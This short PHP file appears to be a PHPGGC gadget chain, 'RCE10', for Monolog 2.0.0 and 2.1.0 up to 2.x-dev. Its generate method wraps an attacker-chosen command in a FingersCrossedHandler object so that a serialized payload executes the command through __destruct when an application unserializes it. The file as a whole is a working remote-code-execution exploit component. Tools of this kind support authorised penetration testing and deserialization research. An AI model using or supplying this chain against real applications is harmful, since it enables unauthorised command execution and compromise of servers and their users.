<?php

namespace GadgetChain\Monolog;

class RCE10 extends \PHPGGC\GadgetChain\RCE\Command
{
    public static $version = '2.0.0 & 2.1.0 <= 2.x-dev';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $command = $parameters['command'];

        return new \Monolog\Handler\FingersCrossedHandler($command);
    }
}